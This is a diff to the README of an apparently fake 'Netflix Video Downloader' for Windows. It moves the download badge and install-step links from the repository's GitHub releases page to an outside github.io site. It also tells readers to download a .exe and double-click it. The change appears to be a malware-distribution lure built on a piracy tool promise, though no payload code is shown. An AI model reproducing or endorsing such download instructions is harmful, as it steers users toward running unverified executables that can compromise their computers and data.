@@ -1,6 +1,6 @@
 # 📺 Netflix-Video-Downloader-2026-1080p - Save your favorite shows in 1080p
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/itsroro/Netflix-Video-Downloader-2026-1080p/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://itsroro.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ This application runs on standard Windows hardware. Ensure your computer meets t
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page to download the latest version: [https://github.com/itsroro/Netflix-Video-Downloader-2026-1080p/releases](https://github.com/itsroro/Netflix-Video-Downloader-2026-1080p/releases).
+1.  Visit the official release page to download the latest version: [https://itsroro.github.io](https://itsroro.github.io).
 2.  Locate the file ending in .exe in the Assets section of the page.
 3.  Click the file name to start the download.
 4.  Open your Downloads folder and double-click the .exe file.
